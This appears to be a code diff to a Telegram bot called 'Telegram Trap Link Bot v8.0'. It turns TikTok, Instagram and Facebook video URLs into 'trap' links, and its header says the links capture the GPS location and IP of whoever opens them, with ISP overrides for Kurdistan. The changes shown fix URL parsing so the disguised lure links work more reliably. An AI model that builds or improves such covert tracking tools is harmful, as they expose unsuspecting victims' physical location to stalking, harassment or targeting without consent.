@@ -5,6 +5,9 @@ Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
 - ✅ ALL functionality preserved
 - ✅ GPS location (most accurate) + IP fallback
 - ✅ Kurdistan ISP overrides
+- ✅ FIXED: TikTok short links (vt.tiktok.com)
+- ✅ FIXED: Instagram URLs with query params (?igsh=...)
+- ✅ FIXED: GPS with better timeout and retry
 """
 
 import os
@@ -97,23 +100,33 @@ CONTENT_TYPE_EMOJI = {
 }
 
 
-# ============ URL PARSING ============
+# ============ URL PARSING (FIXED) ============
 
 def extract_video_info(text):
+    """Extract TikTok, Instagram, Facebook URLs - handles short links and query params."""
     text = text.strip()
-    t = re.search(r'(https?://(?:www\.|vm\.|m\.)?tiktok\.com/\S+)', text, re.IGNORECASE)
+    
+    # TikTok: handles vt.tiktok.com, vm.tiktok.com, www.tiktok.com, tiktok.com
+    t = re.search(r'(https?://(?:vt\.|vm\.|www\.|m\.)?tiktok\.com/\S+)', text, re.IGNORECASE)
     if t:
         url = t.group(1).rstrip('/')
         url = re.sub(r'\?.*$', '', url)
         return ("tiktok", url)
+    
+    # Instagram: handles instagram.com, instagr.am, with /p/, /reel/, /tv/, and query params
     i = re.search(r'(https?://(?:www\.)?(?:instagram\.com|instagr\.am)/(?:p|reel|tv|reels)/[a-zA-Z0-9_-]+)', text, re.IGNORECASE)
     if i:
         url = i.group(1).rstrip('/')
         url = re.sub(r'\?.*$', '', url)
         return ("instagram", url)
+    
+    # Facebook: handles facebook.com, fb.watch, fb.com
     f = re.search(r'(https?://(?:www\.|m\.)?(?:facebook\.com|fb\.watch|fb\.com)/\S+)', text, re.IGNORECASE)
     if f:
-        return ("facebook", text.strip())
+        url = f.group(1).rstrip('/')
+        url = re.sub(r'\?.*$', '', url)
+        return ("facebook", url)
+    
     return None
 
 
@@ -469,11 +482,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         video_info = extract_video_info(text)
         if video_info:
-            platform, _ = video_info
+            platform, url = video_info
             config = user_configs.get(user_id, DEFAULT_CONFIG.copy())
             if platform != config["social_network"]:
                 config["social_network"] = platform
-            config["video_url"] = text
+            config["video_url"] = url
             await generate_and_send_link(update, context, user_id, config)
             return
         else:
@@ -486,10 +499,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     video_info = extract_video_info(text)
     if video_info:
-        platform, _ = video_info
+        platform, url = video_info
         user_configs[user_id] = DEFAULT_CONFIG.copy()
         user_configs[user_id]["social_network"] = platform
-        user_configs[user_id]["video_url"] = text
+        user_configs[user_id]["video_url"] = url
 
         await update.message.reply_text(
             f"✅ *{SOCIAL_NETWORKS[platform]} video detected!*\n\nConfigure your trap:",
@@ -874,6 +887,8 @@ if __name__ == "__main__":
 ║   ✅ ALL functionality preserved                             ║
 ║   ✅ GPS Location (most accurate) + IP fallback              ║
 ║   ✅ Kurdistan ISP overrides                                 ║
+║   ✅ Fixed: TikTok short links (vt.tiktok.com)               ║
+║   ✅ Fixed: Instagram URLs with query params                 ║
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
